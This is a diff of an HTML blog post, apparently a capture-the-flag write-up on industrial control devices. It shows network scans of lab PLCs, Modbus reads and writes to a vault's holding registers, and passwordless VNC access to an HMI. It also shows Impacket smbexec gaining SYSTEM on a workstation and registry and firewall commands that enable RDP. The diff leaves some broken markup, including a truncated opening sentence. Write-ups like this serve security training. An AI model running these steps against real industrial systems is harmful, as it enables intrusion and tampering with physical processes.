@@ -1,19 +1,29 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
     <title>Hacking Bristol for Fun and Profit</title>
-</head>
-<style>
-@import url('https://fonts.googleapis.com/css2?family=Fira+Mono&display=swap');
+    <meta name="description" content="" />
+    <meta property="og:title" content="Hacking Bristol for Fun and Profit" />
+    <meta property="og:description" content="" />
+    <meta property="og:type" content="article" />
+
+    <style>
+    @font-face {
+    font-family: "Fira Mono";
+    src: url("/assets/fonts/FiraMono-Regular.woff2") format("woff2");
+    font-weight: normal;
+    font-style: normal;
+}
 
 footer {
     font-size: 0.7em;
 }
 
 body {
-    font: 1em "Times New Roman", serif;
+    font: 1em "Helvetica", "Arial", sans-serif;
     overflow-y: scroll;
     overflow-wrap: normal;
     max-width: 100ch;
@@ -52,9 +62,7 @@ img {
 }
 
 pre, code {
-    font-size: 0.9em;
     font-family: 'Fira Mono', monospace;
-    background-color: #efefef;
 }
 
 nav ul {
@@ -72,11 +80,15 @@ nav ul li {
 
 blockquote {
     margin-left: 5px;
-    padding-left: 15px;
-    border-left: 3px solid #ccc;
+    padding: 1vh 1vw;
+    border-top-right-radius: 5px;
+    border-bottom-right-radius: 5px;
+    border-left: 5px solid #ababab;
+    background-color: #e2e0e0;
 }
 
-</style>
+    </style>
+</head>
 <body>
 <nav>
     <ul>
@@ -85,7 +97,7 @@ blockquote {
     </ul>
 </nav>
 <h1>Hacking Bristol for Fun and Profit</h1>
-<article><p>The University of Bristol, in collaboration with <a href="https://petras-iot.org/">PETRAS</a>,
+<article>PETRAS</a>,
 hosted a capture-the-flag event revolving around ICS/CPS devices (i.e. devices
 that operate and observe physical processes). I was <del>lured</del> invited to this
 event by a friend who mentioned the event had unique challenges (and an
@@ -153,7 +165,7 @@ the flag.</p>
 <h2>Lockbus</h2>
 <p>The attacker is tasked to read the combination of a vault. We begin by scanning
 the target:</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#323232;">Nmap scan report for 172.20.99.99
 </span><span style="color:#323232;">Host is up (0.0036s latency).
 </span><span style="color:#323232;">Not shown: 65534 closed tcp ports (reset)
@@ -161,7 +173,7 @@ the target:</p>
 </span><span style="color:#323232;">502/tcp open  mbap
 </span><span style="color:#323232;">MAC Address: 00:0C:29:7F:FE:CB (VMware)
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>The host has Modbus accessible. Modbus is a device agnostic protocol for
 querying and modifying the state of a PLC. The vault door is likely storing
 the combination in its holding registers then comparing the combination
@@ -171,7 +183,7 @@ registers from the PLC.</p>
 because it bundles a Python API and a REPL client for issuing Modbus commands.</p>
 <p>We want to read the first 8 holding registers because the flag format is
 <code>bcde{XXXXXXXX}</code> for this task (8 digits = 8 registers).</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#323232;">$ pymodbus.console tcp --host 172.20.99.99 --port 502
 </span><span style="color:#323232;">...
 </span><span style="color:#323232;">&gt; client.connect
@@ -182,7 +194,7 @@ because it bundles a Python API and a REPL client for issuing Modbus commands.</
 </span><span style="color:#323232;">    &quot;registers&quot;: [ 5, 7, 1, 8, 3, 2, 4, 6 ]
 </span><span style="color:#323232;">}
 </span></pre>
-</code></pre>
+</code></code></pre>
 <h3>Part 2</h3>
 <p>This time the vault changes the combination every 30s. We have to modify the
 current combination then read the combination back before it resets. We can
@@ -190,7 +202,7 @@ accomplish this with pymodbus again by issuing a readwrite Modbus command to the
 holding registers. This command will write values to the holding registers then
 read the registers back to validate the write. Then we can read the same
 holding registers to acquire the combination.</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#323232;">$ pymodbus.console tcp --host 172.20.99.99 --port 502
 </span><span style="color:#323232;">...
 </span><span style="color:#323232;">&gt; client.connect
@@ -206,12 +218,12 @@ holding registers to acquire the combination.</p>
 </span><span style="color:#323232;">    &quot;registers&quot;: [ 4, 5, 1, 7, 8, 2, 3, 6 ]
 </span><span style="color:#323232;">}
 </span></pre>
-</code></pre>
+</code></code></pre>
 <h2>Moving the PLC</h2>
 <p>This challenge focused on the “moving target” defense where a PLC will respond,
 imitating other PLCs, differently with each enumeration attempt. Initially,
 we connect to a separate network then attempt to identify the PLC.</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#323232;">$ nmap -sn 172.20.3.0/16
 </span><span style="color:#323232;">...
 </span><span style="color:#323232;">$ nmap -sS -sC -sV 172.20.3.17
@@ -222,13 +234,13 @@ we connect to a separate network then attempt to identify the PLC.</p>
 </span><span style="color:#323232;">102/tcp open  iso-tsap
 </span><span style="color:#323232;">MAC Address: 28:63:36:7F:E6:2F (Siemens AG)
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>Nmap identified port 102 open on a device with a Siemens MAC prefix. Port 102
 is a port used for S7comm (a proprietary protocol for Siemens PLCs). The S7
 protocol is capable of enumerating a device, which <a href="https://nmap.org/nsedoc/scripts/s7-info.html"><code>s7-info.nse</code></a>
 accomplishes within Nmap.</p>
 <blockquote>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#323232;">$ nmap -Pn -p102 --script=s7-info.nse 172.20.3.175
 </span><span style="color:#323232;">PORT    STATE SERVICE  VERSION
 </span><span style="color:#323232;">102/tcp open  iso-tsap Siemens S7 PLC
@@ -257,7 +269,7 @@ accomplishes within Nmap.</p>
 </span><span style="color:#323232;">|_  Copyright: Original Siemens Equipment
 </span><span style="color:#323232;">Service Info: Device: specialized
 </span></pre>
-</code></pre>
+</code></code></pre>
 </blockquote>
 <p>The above snippet is not a mistake; there is a difference between the two.
 In a bid to solve the challenge, we assumed we had to find a way to bypass the
@@ -268,7 +280,7 @@ was captured, I compared the ISO COTP packet bodies (including encapsulated
 data). We did not observe any differences between independent scans; all
 scans were identical.</p>
 <blockquote>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#323232;">CPU functions (ID=0x0011 Index=0x001)
 </span><span style="color:#323232;">0030   XX XX XX XX XX XX 03 00 00 21 02 f0 80 32 07 00
 </span><span style="color:#323232;">0040   00 00 00 00 08 00 08 00 01 12 04 11 44 01 00 ff
@@ -282,7 +294,7 @@ scans were identical.</p>
 </span><span style="color:#323232;">0040   00 00 00 00 08 00 08 00 01 12 04 11 44 01 00 ff
 </span><span style="color:#323232;">0050   09 00 04 00 11 00 01
 </span></pre>
-</code></pre>
+</code></code></pre>
 </blockquote>
 <p>The next approach was acknowledging that the Siemens 1500 PLC supports
 S7CommPlus. S7CommPlus is the modern replacement for S7Comm for newer
@@ -294,7 +306,7 @@ response to any S7Comm traffic because S7CommPlus was the preferred protocol.</p
 use its S7CommPlus client for querying properties of the remote device.
 Fortunately, the output was constant! Unfortunately, the output did not contain
 any useful information.</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#323232;">isf (S7Plus PLC Scan)&gt; use scanners/s7comm_plus_scan
 </span><span style="color:#323232;">isf (S7Plus PLC Scan)&gt; set target 172.20.3.175
 </span><span style="color:#323232;">isf (S7Plus PLC Scan)&gt; run
@@ -315,18 +327,18 @@ any useful information.</p>
 </span><span style="color:#323232;">   ----------               -------------   ----------------    ----------------    ----------
 </span><span style="color:#323232;">    6ES7 518-4AP00-0AB0                     1                   V2.5                172.20.3.175
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>We were stuck for over an hour, unable to make progress until an organiser
 gave us a pretty strong hint that we should <em>keep scanning</em>. I will admit,
 I was getting frustrated so I wrote the following:</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="font-weight:bold;color:#a71d5d;">for </span><span style="color:#323232;">i </span><span style="font-weight:bold;color:#a71d5d;">in </span><span style="color:#323232;">$(seq 0 10000);
 </span><span style="color:#323232;">    </span><span style="font-weight:bold;color:#a71d5d;">do </span><span style="color:#323232;">nmap --script</span><span style="font-weight:bold;color:#a71d5d;">=</span><span style="color:#183691;">s7-info.nse </span><span style="color:#323232;">-p102 172.20.3.175 </span><span style="font-weight:bold;color:#a71d5d;">| </span><span style="color:#323232;">grep -iE </span><span style="color:#183691;">&#39;^\|&#39;
 </span><span style="font-weight:bold;color:#a71d5d;">done
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>Then stared at my terminal for several minutes until one of the scans produced:</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#323232;">| s7-info:
 </span><span style="color:#323232;">|   Module:  6AG1314-6BH04-7AB0
 </span><span style="color:#323232;">|   Basic Hardware:  FLAG-IS-MAN0-PLC
@@ -337,16 +349,16 @@ I was getting frustrated so I wrote the following:</p>
 </span><span style="color:#323232;">|   Plant Identification:
 </span><span style="color:#323232;">|_  Copyright: Original Siemens Equipment
 </span></pre>
-</code></pre>
+</code></code></pre>
 <h2>Simple Asset Discovery 1 &amp; 2</h2>
 <p>We had to find the model number and firmware version of a Siemens and
 Allen-Bradley PLC on a subnet <code>172.20.3.0/24</code>. This is easy enough to do
 with Nmap.</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#323232;">$ nmap --script=s7-info.nse -p 102.20.3.105
 </span><span style="color:#323232;">$ nmap --script=enip-info.nse -sU -p 44818 172.20.3.75
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>We were able to identify the PLCs by performing a host discovery scan then
 filtering by interesting ports. The Siemens PLC responds to Step7 but the
 Allen-Bradley PLC uses EtherNet/IP (ENIP), a UDP based protocol for industrial
@@ -357,10 +369,10 @@ inspect and manipulate the device. We were given a subnet which we had to
 search for an ICS device. This was wasily done with a host-scan <code>nmap -sn</code>.</p>
 <p>Once we had identified candidate hosts, we port scanned the hosts revealing
 a host with port 5900 open (VNC). We connected to the device with</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#323232;">vncviewer &lt;identified-device&gt;
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>We did not provide a password but were able to authenticate then copy the
 flag from the Sm@rtServer display.</p>
 <h3>HMI 2</h3>
@@ -378,7 +390,7 @@ Therefore, by sending small amounts of TCP traffic to both hosts, we can
 determine which is real based off the L1-3 network properties.</p>
 <blockquote>
 <p><strong>172.20.5.3 (host A)</strong></p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#323232;">Frame 86: 58 bytes on wire (464 bits), 58 bytes captured (464 bits) on interface en0, id 0
 </span><span style="color:#323232;">Ethernet II, Src: Apple_21:40:71 (fc:e2:6c:21:40:71), Dst: Raspberr_56:3a:ea (d8:3a:dd:56:3a:ea)
 </span><span style="color:#323232;">    Destination: Raspberr_56:3a:ea (d8:3a:dd:56:3a:ea)
@@ -387,11 +399,11 @@ determine which is real based off the L1-3 network properties.</p>
 </span><span style="color:#323232;">Internet Protocol Version 4, Src: 172.20.2.238, Dst: 172.20.5.3
 </span><span style="color:#323232;">Transmission Control Protocol, Src Port: 48659, Dst Port: 80, Seq: 0, Len: 0
 </span></pre>
-</code></pre>
+</code></code></pre>
 </blockquote>
 <blockquote>
 <p><strong>172.20.5.2 (host B)</strong></p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#323232;">Frame 121: 58 bytes on wire (464 bits), 58 bytes captured (464 bits) on interface en0, id 0
 </span><span style="color:#323232;">Ethernet II, Src: Apple_21:40:71 (fc:e2:6c:21:40:71), Dst: SiemensI_07:8b:8a (4c:e7:05:07:8b:8a)
 </span><span style="color:#323232;">    Destination: SiemensI_07:8b:8a (4c:e7:05:07:8b:8a)
@@ -400,7 +412,7 @@ determine which is real based off the L1-3 network properties.</p>
 </span><span style="color:#323232;">Internet Protocol Version 4, Src: 172.20.2.238, Dst: 172.20.5.2
 </span><span style="color:#323232;">Transmission Control Protocol, Src Port: 58081, Dst Port: 80, Seq: 0, Len: 0
 </span></pre>
-</code></pre>
+</code></code></pre>
 </blockquote>
 <p>The obvious giveaway is that the MAC address for A has a prefix assigned to
 the Raspberry Pi company whereas B has a prefix assigned to Siemens.
@@ -448,7 +460,7 @@ assumed to have acquired the engineer workstation credentials:</p>
 the workstation, remotely (i.e. we had to remotely compromise the workstation).</p>
 <p>Our machine was connected to the same subnet as the workstation so we had to
 discover the PLC and workstation.</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#323232;">$ nmap -sn 192.168.2.0/24
 </span><span style="color:#323232;">Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-15 11:00 BST
 </span><span style="color:#323232;">Nmap scan report for 192.168.2.1
@@ -462,10 +474,10 @@ discover the PLC and workstation.</p>
 </span><span style="color:#323232;">MAC Address: AC:91:A1:39:0C:94 (Unknown)
 </span><span style="color:#323232;">Nmap done: 256 IP addresses (3 hosts up) scanned in 15.16 seconds
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>The workstation was easily identified by its MAC address. Next we scanned the
 workstation (192.168.2.251):</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#323232;">$ nmap -sS -sC -sV -Pn 192.168.2.251
 </span><span style="color:#323232;">Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-15 11:02 BST
 </span><span style="color:#323232;">Nmap scan report for 192.168.2.251
@@ -498,7 +510,7 @@ workstation (192.168.2.251):</p>
 </span><span style="color:#323232;">49688/tcp open  unknown
 </span><span style="color:#323232;">MAC Address: AC:91:A1:39:0C:94 (Unknown)
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>Nmap is overzealous with its service identification but we can conclude it is
 a Windows machine based off of 135, 445, 1801, and 2179.</p>
 <p>Enumerating Windows machines can be tricky without knowing the capabilities of
@@ -510,7 +522,7 @@ a shortcut to <a href="https://www.siemens.com/global/en/products/automation/ind
 with Siemens PLCs over S7 (including uploading logic). After inspecting the
 SMB shares, we created an interactive session with the workstation using
 Impacket’s <a href="https://github.com/fortra/impacket/blob/master/examples/smbexec.py">smbexec.py</a>.</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#323232;">$ python3 impacket/examples/smbexec.py Admin</span><span style="font-weight:bold;color:#a71d5d;">@</span><span style="color:#0086b3;">192</span><span style="color:#323232;">.</span><span style="color:#0086b3;">168</span><span style="color:#323232;">.</span><span style="color:#0086b3;">2</span><span style="color:#323232;">.</span><span style="color:#0086b3;">251
 </span><span style="color:#323232;">Impacket v0.</span><span style="color:#0086b3;">12</span><span style="color:#323232;">.</span><span style="color:#0086b3;">0</span><span style="color:#323232;">.dev1</span><span style="color:#0086b3;">+20230914</span><span style="color:#323232;">.</span><span style="color:#0086b3;">31713</span><span style="color:#323232;">.6a3ecf7e - Copyright </span><span style="color:#0086b3;">2023</span><span style="color:#323232;"> Fortra
 </span><span style="color:#323232;">
@@ -519,7 +531,7 @@ Impacket’s <a href="https://github.com/fortra/impacket/blob/master/examples/sm
 </span><span style="color:#323232;">C:\Windows\system32</span><span style="font-weight:bold;color:#a71d5d;">&gt;whoami
 </span><span style="color:#323232;">nt authority\system
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>We can authenticate as the admin so we have the ability to execute any
 commands but we cannot use TIA because TIA is a strictly GUI application – we
 need remote desktop. We wasted a decent amount of time exploring the <code>vmrdp</code>
@@ -527,7 +539,7 @@ because VMRDP allows administrators to remotely connect to a virtual machine.
 However, VMRDP was unable to provide a session so we had to look elsewhere.</p>
 <p>Despite having, VMRDP, the workstation does not have regular RDP enabled but we
 can enable RDP with the following:</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#323232;">C:\Windows\system32&gt;reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f
 </span><span style="color:#323232;">The operation completed successfully.
 </span><span style="color:#323232;">
@@ -539,12 +551,12 @@ can enable RDP with the following:</p>
 </span><span style="color:#323232;">Updated 3 rule(s).
 </span><span style="color:#323232;">Ok.
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>Once RDP was enabled we could connect with xfreerdp</p>
-<pre style="background-color:#ffffff;">
+<code><pre>
 <span style="color:#323232;">$ xfreerdp /u:Admin /v:</span><span style="color:#0086b3;">192</span><span style="color:#323232;">.</span><span style="color:#0086b3;">168</span><span style="color:#323232;">.</span><span style="color:#0086b3;">2</span><span style="color:#323232;">.</span><span style="color:#0086b3;">251</span><span style="color:#323232;"> /smart-sizing
 </span></pre>
-</code></pre>
+</code></code></pre>
 <p>then use TIA Portal to view the flag in the logic comments.</p>
 <img alt="screenshot of xfreerdp" src="/assets/scalpel_logic.jpg" width=50% />
 <p>An interesting nuance to this challenge is that metasploit will not work;
